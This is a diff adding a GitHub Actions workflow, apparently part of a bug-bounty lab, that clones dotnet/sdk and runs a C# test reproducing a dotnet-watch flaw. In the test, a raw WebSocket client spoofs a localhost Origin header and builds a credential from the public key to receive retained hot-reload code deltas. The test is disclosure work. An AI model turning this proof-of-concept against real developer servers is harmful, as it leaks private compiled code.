@@ -1,0 +1,195 @@
+name: dotnet-watch-remote-browser-tools-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/dotnet-watch-remote-browser-tools-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install SDK required by dotnet/sdk current main
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '11.0.100-rc.1.26420.103'
+
+      - name: Clone current dotnet/sdk main
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/dotnet-sdk-security-lab
+          git clone --depth 1 --filter=blob:none https://github.com/dotnet/sdk.git /tmp/dotnet-sdk-security-lab
+          cd /tmp/dotnet-sdk-security-lab
+          echo "DOTNET_SDK_MAIN_SHA=$(git rev-parse HEAD)"
+          git log -1 --oneline
+
+      - name: Add benign source-level security regression test
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > /tmp/dotnet-sdk-security-lab/test/dotnet-watch.Tests/Browser/BrowserToolsRemoteClientSecurityTests.cs <<'EOF'
+          using System.Net;
+          using System.Net.WebSockets;
+          using System.Security.Cryptography;
+          using System.Text;
+          using Microsoft.DotNet.HotReload;
+
+          namespace Microsoft.DotNet.Watch.UnitTests;
+
+          [TestClass]
+          public class BrowserToolsRemoteClientSecurityTests
+          {
+              public TestContext TestContext { get; set; } = null!;
+
+              [TestMethod]
+              public async Task SpoofedLocalhostOrigin_WithPublicBuildKey_CanReceiveRetainedManagedCodeDelta()
+              {
+                  using var rsa = RSA.Create(2048);
+                  var keyParameters = rsa.ExportParameters(includePrivateParameters: true);
+                  using var publicKeyProvider = new SharedSecretProvider(keyParameters);
+
+                  using var server = new BrowserRefreshServer(
+                      logger: new TestLogger(),
+                      connectionServerLoggerFactory: _ => new TestLogger(),
+                      connectionAgentLoggerFactory: _ => new TestLogger(),
+                      configureLaunchEnvironment: static (_, _) => { },
+                      dotnetPath: "dotnet",
+                      sessionKeyFactory: () => new SharedSecretProvider(keyParameters),
+                      webSocketConfig: new WebSocketConfig(
+                          port: 0,
+                          securePort: null,
+                          hostName: null,
+                          additionalAllowedOrigins: []),
+                      suppressTimeouts: true);
+
+                  await server.StartAsync(TestContext.CancellationToken);
+
+                  // Simulate an update produced before any browser/client has connected.
+                  // The provider intentionally retains it for replay to the next accepted client.
+                  const string metadataSentinel = "PRIVATE_METADATA_DELTA_SENTINEL_20260921";
+                  const string ilSentinel = "PRIVATE_IL_DELTA_SENTINEL_20260921";
+                  const string pdbSentinel = "PRIVATE_PDB_DELTA_SENTINEL_20260921";
+
+                  var epoch = server.ResetUpdates();
+                  var batch = new BrowserToolsUpdateBatch(
+                  [
+                      new BrowserToolsManagedCodeUpdate(
+                          Guid.Parse("11111111-2222-3333-4444-555555555555"),
+                          Encoding.UTF8.GetBytes(metadataSentinel),
+                          Encoding.UTF8.GetBytes(ilSentinel),
+                          Encoding.UTF8.GetBytes(pdbSentinel),
+                          [7, 9])
+                  ]);
+
+                  Assert.IsTrue(await server.SendManagedCodeUpdateAsync(
+                      epoch,
+                      batch,
+                      static _ => ReadOnlyMemory<byte>.Empty,
+                      TestContext.CancellationToken));
+
+                  // A non-browser attacker can obtain the public key from the build-generated
+                  // BrowserTools.Config.js asset. A public key is sufficient to mint a fresh
+                  // encrypted WebSocket subprotocol; no pre-existing session secret is required.
+                  var attackerSecret = RandomNumberGenerator.GetBytes(32);
+                  var subProtocol = ToSubProtocol(EncryptSecret(publicKeyProvider.GetPublicKey(), attackerSecret));
+
+                  // The actual Origin guard rejects a non-local hostname.
+                  Assert.AreEqual(
+                      HttpStatusCode.Forbidden,
+                      await TryRejectedConnectAsync(server.ProviderAddress, "http://evil.example:45678", subProtocol));
+
+                  // But it authorizes only originUri.Host, so a raw network client can spoof
+                  // localhost with any scheme/port even though it did not originate from the app.
+                  using var socket = new ClientWebSocket();
+                  socket.Options.SetRequestHeader("Origin", "http://localhost:45678");
+                  socket.Options.AddSubProtocol(subProtocol);
+
+                  var connectUri = new UriBuilder(server.ProviderAddress)
+                  {
+                      Scheme = "ws",
+                      Path = BrowserToolsProtocol.RoutePrefix + BrowserToolsProtocol.ConnectPath
+                  }.Uri;
+
+                  await socket.ConnectAsync(connectUri, TestContext.CancellationToken);
+                  Assert.AreEqual(WebSocketState.Open, socket.State);
+
+                  var message = await ReceiveTextAsync(socket, TestContext.CancellationToken);
+
+                  Assert.Contains(Convert.ToBase64String(Encoding.UTF8.GetBytes(metadataSentinel)), message);
+                  Assert.Contains(Convert.ToBase64String(Encoding.UTF8.GetBytes(ilSentinel)), message);
+                  Assert.Contains(Convert.ToBase64String(Encoding.UTF8.GetBytes(pdbSentinel)), message);
+
+                  Console.WriteLine("REMOTE_CLIENT_PUBLIC_KEY_CREDENTIAL=CONFIRMED");
+                  Console.WriteLine("REMOTE_CLIENT_SPOOFED_LOCALHOST_ORIGIN=ACCEPTED");
+                  Console.WriteLine("REMOTE_CLIENT_RETAINED_METADATA_DELTA=DISCLOSED");
+                  Console.WriteLine("REMOTE_CLIENT_RETAINED_IL_DELTA=DISCLOSED");
+                  Console.WriteLine("REMOTE_CLIENT_RETAINED_PDB_DELTA=DISCLOSED");
+
+                  var ack = Encoding.UTF8.GetBytes("{\"success\":true,\"log\":[]}");
+                  await socket.SendAsync(ack, WebSocketMessageType.Text, true, TestContext.CancellationToken);
+                  await socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "done", TestContext.CancellationToken);
+              }
+
+              private async Task<HttpStatusCode> TryRejectedConnectAsync(Uri baseAddress, string origin, string subProtocol)
+              {
+                  using var socket = new ClientWebSocket();
+                  socket.Options.CollectHttpResponseDetails = true;
+                  socket.Options.SetRequestHeader("Origin", origin);
+                  socket.Options.AddSubProtocol(subProtocol);
+
+                  var address = new UriBuilder(baseAddress)
+                  {
+                      Scheme = "ws",
+                      Path = BrowserToolsProtocol.RoutePrefix + BrowserToolsProtocol.ConnectPath
+                  }.Uri;
+
+                  await Assert.ThrowsExactlyAsync<WebSocketException>(
+                      () => socket.ConnectAsync(address, TestContext.CancellationToken));
+                  return socket.HttpStatusCode;
+              }
+
+              private static string EncryptSecret(string publicKey, byte[] secret)
+              {
+                  using var rsa = RSA.Create();
+                  rsa.ImportSubjectPublicKeyInfo(Convert.FromBase64String(publicKey), out _);
+                  return Convert.ToBase64String(rsa.Encrypt(secret, RSAEncryptionPadding.OaepSHA256));
+              }
+
+              private static string ToSubProtocol(string encryptedSecret)
+                  => Uri.EscapeDataString(encryptedSecret);
+
+              private static async Task<string> ReceiveTextAsync(ClientWebSocket socket, CancellationToken cancellationToken)
+              {
+                  var buffer = new byte[256 * 1024];
+                  using var stream = new MemoryStream();
+
+                  WebSocketReceiveResult result;
+                  do
+                  {
+                      result = await socket.ReceiveAsync(buffer, cancellationToken);
+                      Assert.AreEqual(WebSocketMessageType.Text, result.MessageType);
+                      stream.Write(buffer, 0, result.Count);
+                  }
+                  while (!result.EndOfMessage);
+
+                  return Encoding.UTF8.GetString(stream.ToArray());
+              }
+          }
+          EOF
+
+      - name: Run only the security regression test against current main
+        shell: bash
+        working-directory: /tmp/dotnet-sdk-security-lab
+        run: |
+          set -euo pipefail
+          dotnet --info
+          dotnet test test/dotnet-watch.Tests/dotnet-watch.Tests.csproj             -c Release             --filter "FullyQualifiedName~BrowserToolsRemoteClientSecurityTests"             --logger "console;verbosity=normal"
